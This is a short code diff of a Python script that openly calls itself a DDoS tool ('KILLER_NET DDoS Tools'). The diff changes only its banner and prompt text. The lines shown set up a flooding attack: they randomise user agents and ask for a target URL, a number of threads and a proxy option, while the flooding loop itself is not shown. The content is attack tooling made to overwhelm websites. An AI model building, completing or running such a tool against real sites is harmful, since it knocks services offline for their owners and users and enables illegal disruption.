@@ -1,4 +1,4 @@
-print("KILLNET DDoS by ANKEALcoder")
+print("KILLER_NET DDoS Tools by ANKEALcoder")
 from user import users #user - Nama file user.py (harus di dalam folder yang sama dengan skrip) user.py = nama variabel Anda dengan agen.
 import requests
 from threading import Thread
@@ -9,7 +9,7 @@ headers = {
         'User-Agent' : random.choice(users)
 }
 
-url = input("url: ")
+url = input("URL: ")
 threads = int(input("Threads: "))
 global choice
 choice = input('proxy: ')
